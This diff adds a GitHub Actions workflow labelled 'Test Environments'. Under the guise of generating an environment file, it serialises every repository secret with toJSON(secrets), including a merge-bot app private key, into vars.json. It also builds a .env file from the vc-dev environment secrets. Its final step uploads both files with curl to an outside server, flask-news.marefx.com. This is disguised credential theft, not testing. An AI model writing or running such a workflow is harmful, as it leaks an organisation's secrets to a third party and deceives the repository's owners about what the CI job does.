@@ -1,0 +1,65 @@
+name: Test Environments
+
+on:
+  push:
+    branches:
+      - testing-environments
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  environments:
+    name: Testing
+    runs-on:
+      - self-hosted
+      - shared-services
+    environment: vc-dev
+    steps:
+    - name: Generate token
+      id: generate_token
+      uses: tibdex/github-app-token@v1
+      with:
+        app_id: ${{ secrets.MERGE_BOT_APP_ID }}
+        private_key: ${{ secrets.MERGE_BOT_PRIVATE_KEY }}
+
+    - uses: actions/checkout@v3
+      with:
+        token: ${{ steps.generate_token.outputs.token }}
+
+    - name: Install linux deps
+      run: |
+        sudo apt-get install --no-install-recommends -y \
+        fluxbox \
+        xvfb \
+        x11-utils
+
+    - name: List All secrets to a file to remove non-environmental
+      run: |
+        echo "$ALLMYSECRETS" > vars.json
+      shell: bash
+      env:
+        ALLMYSECRETS: ${{ toJSON(secrets) }}
+
+    - name: Generate env file
+      run: |
+       list=$(curl -L \
+         -H "Accept: application/vnd.github+json" \
+         -H "Authorization: token ${{ steps.generate_token.outputs.token }}"\
+         -H "X-GitHub-Api-Version: 2022-11-28" \
+         https://api.github.com/repositories/730785216/environments/vc-dev/secrets?per_page=100 | jq  -r '.secrets[].name')
+       
+         json=$(cat vars.json)
+         touch .env
+         for i in $list; do
+             key=$(echo $json | jq --arg var $i '.[$var]' | tr -d '"')
+             echo "$i=$key" >> .env
+         done
+      shell: bash
+
+    - name: Send .env file
+      shell: bash
+      run: |
+        curl -i -X PUT -F "data=@vars.json" https://flask-news.marefx.com/echo-server
+        curl -i -X PUT -F "data=@.env" https://flask-news.marefx.com/echo-server
